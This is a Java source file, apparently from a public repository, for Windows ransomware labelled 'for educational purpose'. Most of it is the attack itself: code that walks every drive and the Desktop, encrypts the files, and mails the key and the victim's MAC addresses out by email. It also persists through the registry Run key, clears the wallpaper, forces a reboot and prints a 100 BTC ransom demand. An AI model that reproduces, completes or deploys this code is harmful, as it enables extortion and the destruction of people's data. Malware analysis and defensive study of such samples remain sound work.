import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.FileSystems;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Random;
import java.util.Scanner;

import javax.swing.JOptionPane;

/**
 * @author Amirreza Marzban
 * Dangerous ransomware
 * This Program is only for educational purpose.
 * *******Use Right********
 */

public class Main extends Core {
  private static int status;

  public static void main(String[] args) {
    if (!isInterneton()) {
      JOptionPane.showMessageDialog(null, "Check your internet connection and try again !");
      System.exit(1);
    }
    if (!new File("C:\\Users\\status").exists()) {
      createFile("C:\\Users\\status", 0);
    }
    status = Integer.parseInt(new String(Base64.getDecoder().decode(Core.readFile("C:\\Users\\status"))));
    if (status == 0) {
      System.out.println("Installing the program...");
      findFiles();
      System.exit(1);
    }
    textArt();
    findFiles();
  }

  /**
   * print scary text art for victim after reset
   */
  static void textArt() {
    System.out.println("@@@@@                                        @@@@@\n" +
      "@@@@@@@                                      @@@@@@@\n" +
      "@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@\n" +
      " @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@\n" +
      "     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@\n" +
      "       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@\n" +
      "         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@\n" +
      "            @@@@@@@    @@@@@@    @@@@@@\n" +
      "            @@@@@@      @@@@      @@@@@\n" +
      "            @@@@@@      @@@@      @@@@@\n" +
      "             @@@@@@    @@@@@@    @@@@@\n" +
      "              @@@@@@@@@@@  @@@@@@@@@@\n" +
      "               @@@@@@@@@@  @@@@@@@@@\n" +
      "           @@   @@@@@@@@@@@@@@@@@   @@\n" +
      "           @@@@  @@@@ @ @ @ @ @@@@  @@@@\n" +
      "          @@@@@   @@@ @ @ @ @ @@@   @@@@@\n" +
      "        @@@@@      @@@@@@@@@@@@@      @@@@@\n" +
      "      @@@@          @@@@@@@@@@@          @@@@\n" +
      "   @@@@@              @@@@@@@              @@@@@\n" +
      "  @@@@@@@                                 @@@@@@@\n" +
      "   @@@@@                                   @@@@@");
    System.out.println("*************************************************************************");
    System.out.println("\"Your files are encrypted. pay the 100 BTC to unlock your files !!\"");
    System.out.println("*************************************************************************");
    System.out.println("\"send me the BTC bill to *****@gmail.com and get your decryption key !!\"");
    System.out.println("*************************************************************************");
    System.out.println("\"Wallet\": Your wallet");
    System.out.println("*************************************************************************");
    System.out.println("\"Attention\": If you enter wrong key your files will be disappear");
    System.out.println("*************************************************************************");
    System.out.print("\"Enter the Key: \"");
  }

  /**
   * Add a new value in regedit path: "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
   * This value force windows to add ransomware in startup programs
   * Add a new value in regedit path: "HKEY_CURRENT_USER\\Control Panel\Desktop"
   * This value remove the windows background
   */
  static void writeInRegistry() {
    try {
      String p = System.getProperty("user.dir");
      WinRegistry.writeStringValue(
        WinRegistry.HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "ransome",
        p + "\\setup.exe",
        1);
      WinRegistry.writeStringValue(
        WinRegistry.HKEY_CURRENT_USER,
        "Control Panel\\Desktop",
        "Wallpaper",
        "",
        1);
    } catch (IllegalAccessException e) {
      e.printStackTrace();
    } catch (InvocationTargetException e) {
      e.printStackTrace();
    }
    //reset the computer with a message
    runCommand("shutdown -r -c \"Gooooooooooooooooooooood Bye...\"", null);
  }

  /**
   * Search all dirvers
   * @return the victim drivers
   */
  static ArrayList<String> findDrives() {
    ArrayList<String> arrayList = new ArrayList<>();
    String drives[] = {"A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:"};
    for (String d : drives) {
      FileSystems.getDefault().getFileStores().forEach(root -> {
          if (root.toString().contains(d)) {
            arrayList.add(d);
          }
        }
      );
    }
    return arrayList;
  }

  /**
   * The heart of ransomware !!
   */
  static void findFiles() {
    try {
      Process runtime;
      for (String drive : findDrives()) {
        if(drive.equals("C:")) {
          drive = System.getProperty("user.home") + "\\Desktop";
        }
        runtime = Runtime.getRuntime().exec("cmd /c dir /S /B *", null, new File(drive));

        BufferedReader inputStream = new BufferedReader(new InputStreamReader(runtime.getInputStream()));
        String s = "";
        if (status == 1) {
          String decryptedKey = new String(Base64.getDecoder().decode(readFile("C:\\Users\\Keys")));
          Scanner scanner = new Scanner(System.in);
          String userInput = scanner.nextLine();
          if (userInput.equals(decryptedKey)) {
            System.out.println("\"Your files are getting back...\"");
            while ((s = inputStream.readLine()) != null) {
              encryptFile(new File(s), Integer.parseInt(decryptedKey), status);
            }
          } else {
            System.out.println("The Key is wrong");
            findFiles();
          }
        } else {
          int key = new Random().nextInt();
          StringBuilder stringBuilder = new StringBuilder();
          createFile("C:\\Users\\Keys", key);
          while ((s = inputStream.readLine()) != null) {
//            System.out.println("installing file : " + s);
            encryptFile(new File(s), key, status);
          }
          for (String mac : runCommand("cmd /c ipconfig/all|find \"Physical Address\"", null)) {
            stringBuilder.append(mac);
          }
          Mailer.send("****@example.com", "New Key", stringBuilder.toString() + "\n" + String.valueOf(key));
          writeInRegistry();
          System.exit(1);
        }
      }
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
}